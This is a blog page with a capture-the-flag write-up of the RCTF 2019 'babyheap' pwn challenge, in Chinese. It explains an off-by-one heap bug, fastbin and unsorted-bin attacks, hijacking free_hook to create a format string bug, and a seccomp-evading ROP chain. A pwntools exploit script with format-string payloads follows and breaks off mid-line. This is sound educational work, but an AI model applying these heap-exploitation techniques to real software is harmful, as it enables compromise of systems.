<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="大概是老了，PWN不动了，打了一天时间，一共看了三道题，第二天学校有活动，晚上抽时间写好了ManyNotes的EXP，不过远程打不下，并不是像前两题因为系统调用crash，而是中间我爆破了1字节地址，本地ubuntu 18.04(libc-2.27)可以利用成功，但是远程无法爆破出，利用思路上自认没有问题，猜测应该是新线程堆地址偏移在libc-2.26和libc-2.27环境下低字节有区别或者像b">
<meta property="og:type" content="article">
<meta property="og:title" content="RCTF 2019 PWN">
<meta property="og:url" content="http://yoursite.com/2019/05/20/RCTF-2019-PWN/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="大概是老了，PWN不动了，打了一天时间，一共看了三道题，第二天学校有活动，晚上抽时间写好了ManyNotes的EXP，不过远程打不下，并不是像前两题因为系统调用crash，而是中间我爆破了1字节地址，本地ubuntu 18.04(libc-2.27)可以利用成功，但是远程无法爆破出，利用思路上自认没有问题，猜测应该是新线程堆地址偏移在libc-2.26和libc-2.27环境下低字节有区别或者像b">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2019-05-20T11:00:23.000Z">
<meta property="article:modified_time" content="2019-05-20T14:41:42.000Z">
<meta property="article:author" content="Kirin">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo.jpg">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo.jpg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.jpg">
          
        
    
    <!-- title -->
    <title>RCTF 2019 PWN</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/06/13/TCTF-2019-Finals-in-Shanghai/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/04/29/CTF-2019-PWN/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/05/20/RCTF-2019-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&text=RCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&title=RCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&is_video=false&description=RCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RCTF 2019 PWN&body=Check out this article: http://yoursite.com/2019/05/20/RCTF-2019-PWN/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&title=RCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&title=RCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&title=RCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&title=RCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/05/20/RCTF-2019-PWN/&name=RCTF 2019 PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-babyheap"><span class="toc-number">1.</span> <span class="toc-text">0x01 babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-shellcoder"><span class="toc-number">2.</span> <span class="toc-text">0x02 shellcoder</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-1"><span class="toc-number">2.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-ManyNotes"><span class="toc-number">3.</span> <span class="toc-text">0x03 ManyNotes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-2"><span class="toc-number">3.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">3.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        RCTF 2019 PWN
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-05-20T11:00:23.000Z" itemprop="datePublished">2019-05-20</time>
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>大概是老了，PWN不动了，打了一天时间，一共看了三道题，第二天学校有活动，晚上抽时间写好了ManyNotes的EXP，不过远程打不下，并不是像前两题因为系统调用crash，而是中间我爆破了1字节地址，本地ubuntu 18.04(libc-2.27)可以利用成功，但是远程无法爆破出，利用思路上自认没有问题，猜测应该是新线程堆地址偏移在libc-2.26和libc-2.27环境下低字节有区别或者像babyheap因为中间远程传输过长数据会出玄学，可惜没时间重新调了，姑且算是搞定了</p>
<h2 id="0x01-babyheap"><a href="#0x01-babyheap" class="headerlink" title="0x01 babyheap"></a>0x01 babyheap</h2><h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>首先在init中可以看到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fd = <span class="built_in">open</span>(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"open failed!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">read</span>(fd, &amp;ptrs, <span class="number">8u</span>LL);</span><br><span class="line"><span class="built_in">close</span>(fd);</span><br><span class="line">ptrs = (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)ptrs &amp; <span class="number">0xFFFF0000</span>);</span><br><span class="line">mallopt(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( mmap(ptrs, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L) != ptrs )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"mmap error!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序会随机map一段地址用于后期存放note结构体:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">note_addr</span><br><span class="line">note_len</span><br></pre></td></tr></table></figure>
<p>而后使用mallopt关闭了fastbin的分配<br>可以看到漏洞在:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Content: "</span>, v3);</span><br><span class="line"> v1 = read_n(*((<span class="keyword">void</span> **)ptrs + <span class="number">2</span> * v0), *((_DWORD *)ptrs + <span class="number">4</span> * v0 + <span class="number">2</span>));</span><br><span class="line"> *(_BYTE *)(*((_QWORD *)ptrs + <span class="number">2</span> * v0) + v1) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>存在off by one,当v1恰好读到边界时，会溢出一字节”\x00”<br>首先利用”\x00”溢出来修改pre in use位来使伪造好的chunk因为unsorted bin的unlink合并，进而构造堆重叠<br>而后即可free掉重叠堆块进入unsorted bin来leak libc<br>下面我选择直接unsorted bin attack，将chunk地址写入global_max_fast,因为地址非负，重新开启fastbin的分配，此时重叠堆再次释放即可进入fastbin，进而fd因为重叠可控，修改malloc_hook为one_target后发现crash<br>想起init中的:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Could not start seccomp:"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( prctl(<span class="number">22</span>, <span class="number">2L</span>L, &amp;filterprog) == <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Could not start seccomp:"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开启了seccomp<br>使用seccomp-tools查看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;rctf$ seccomp-tools  dump .&#x2F;babyheap </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A &#x3D;&#x3D; ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x00000029  if (A !&#x3D; socket) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x0000003b  if (A !&#x3D; execve) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x00000039  if (A !&#x3D; fork) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x0000009d  if (A !&#x3D; prctl) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x0000003a  if (A !&#x3D; vfork) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0014: 0x15 0x00 0x01 0x00000065  if (A !&#x3D; ptrace) goto 0016</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x0000003e  if (A !&#x3D; kill) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0018: 0x15 0x00 0x01 0x00000038  if (A !&#x3D; clone) goto 0020</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>
<p>关闭了execv，只能想办法open，read，write<br>这里我选择修改free_hook为printf来人为构造格式化字符串漏洞<br>这里有个小问题，本题环境下free_hook周围没有0x7F这种合法size<br>因此选择从最近的存在合法size位置不断fastbin attack并写入合法地址，直到分配进free_hook<br>而后利用格式化字符串漏洞leak stack&amp;&amp;程序加载地址<br>接着利用格式化在栈中写入一个合法size(因为栈中有bp指针，可以直接用%n写入高地址)<br>将一个chunk分配进栈，而后写入ptrs地址<br>这样就可以再次利用格式化字符串泄露最初mmap的地址<br>而后再次利用fastbin attack将堆分配进mmap处即可控制整个结构实现任意地址读写<br>直接选择在edit时改写返回地址为rop链<br>调用open(“./flag”,“r”)-&gt;read(fd,note_addr,len)-&gt;show(note)即可最终获得flag</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: \n"</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,note)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: \n"</span>,<span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"Content: "</span>,note)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: \n"</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: \n"</span>,<span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>,str(index))</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(<span class="string">"\n"</span>).strip()</span><br><span class="line"><span class="comment">#p=process("./babyheap")</span></span><br><span class="line">p=remote(<span class="string">"123.206.174.203"</span>,<span class="number">20001</span>)</span><br><span class="line">add(<span class="number">0x18</span>)     </span><br><span class="line">add(<span class="number">0x508</span>)    </span><br><span class="line">add(<span class="number">0x18</span>)     </span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'b'</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))  </span><br><span class="line">add(<span class="number">0x18</span>)     </span><br><span class="line">add(<span class="number">0x508</span>)    </span><br><span class="line">add(<span class="number">0x18</span>)     </span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'b'</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))  </span><br><span class="line">add(<span class="number">0x18</span>)     </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'b'</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)     </span><br><span class="line">add(<span class="number">0x4d8</span>)    </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)  </span><br><span class="line">add(<span class="number">0x18</span>)     </span><br><span class="line">libc_addr=u64(show(<span class="number">7</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))+<span class="number">0x7f0e884c5000</span><span class="number">-0x7f0e88889b78</span></span><br><span class="line">max_fast=libc_addr+<span class="number">0x7f0e8888b7f8</span><span class="number">-0x7f0e884c5000</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line"><span class="keyword">print</span> hex(max_fast)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x4f1</span>)+<span class="string">"aaaaaaaa"</span>+p64(max_fast<span class="number">-16</span>))</span><br><span class="line">add(<span class="number">0x4e8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(libc_addr+<span class="number">0x7f15218e7715</span><span class="number">-0x7f1521522000</span>))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">"\x00"</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">8</span>+p64(<span class="number">0x551</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x551</span>))</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x30</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x551</span>)+p64(libc_addr+<span class="number">0x7f592d7ab760</span><span class="number">-0x7f592d3e6000</span>))</span><br><span class="line">add(<span class="number">0x548</span>)</span><br><span class="line">add(<span class="number">0x548</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(<span class="number">0</span>)*(<span class="number">0x53</span>*<span class="number">2</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x551</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x551</span>))</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x20</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x551</span>)+p64(libc_addr<span class="number">-0x7fd6e0f9b000</span>+<span class="number">0x7fd6e1360ca0</span>))</span><br><span class="line">add(<span class="number">0x548</span>)</span><br><span class="line">add(<span class="number">0x548</span>)</span><br><span class="line">edit(<span class="number">9</span>,p64(<span class="number">0</span>)*(<span class="number">0x53</span>*<span class="number">2</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x551</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x551</span>))</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x20</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x551</span>)+p64(libc_addr- <span class="number">0x7f80b6025000</span>+<span class="number">0x7f80b63eb1e0</span>))</span><br><span class="line">add(<span class="number">0x548</span>)</span><br><span class="line">add(<span class="number">0x548</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(<span class="number">0</span>)*(<span class="number">0x53</span>*<span class="number">2</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x601</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x601</span>))</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">25</span>+p64(<span class="number">0x20</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x601</span>)+p64(libc_addr+<span class="number">0x7fd775994720</span><span class="number">-0x7fd7755ce000</span>))</span><br><span class="line">add(<span class="number">0x5f8</span>)</span><br><span class="line">add(<span class="number">0x5f8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p) </span></span><br><span class="line">edit(<span class="number">11</span>,<span class="string">"\x00"</span>*<span class="number">0x78</span>+p64(libc_addr+<span class="number">0x55800</span>)+<span class="string">"\x00"</span>*<span class="number">72</span>+p64(<span class="number">0x1000</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">"%7$llx %8$llx %9$llx %15$llx"</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">s=p.recvuntil(<span class="string">"D"</span>)[:<span class="number">-1</span>]</span><br><span class="line">addrs=s.split(<span class="string">" "</span>)</span><br><span class="line">exec_addr=int(addrs[<span class="number">3</span>],<span class="number">16</span>)<span class="number">-0x55b2ee49e2c2</span>+<span class="number">0x55b2ee49d000</span></span><br><span class="line">stack_addr=int(addrs[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(exec_addr)</span><br><span class="line"><span class="keyword">print</span> hex(stack_addr)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">"%65c%48$n%48$llx"</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">11</span>,<span class="string">"\x00"</span>*<span class="number">0x78</span>+p64(<span class="number">0</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>))</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>)+p64(stack_addr+<span class="number">0x7ffd8412fc00</span><span class="number">-0x7ffd8412faf0</span>))</span><br><span class="line">add(<span class="number">0x31</span>)</span><br><span class="line">add(<span class="number">0x31</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(exec_addr+<span class="number">0x202112</span>))</span><br><span class="line">edit(<span class="number">11</span>,<span class="string">"\x00"</span>*<span class="number">0x78</span>+p64(libc_addr+<span class="number">0x55800</span>))</span><br><span 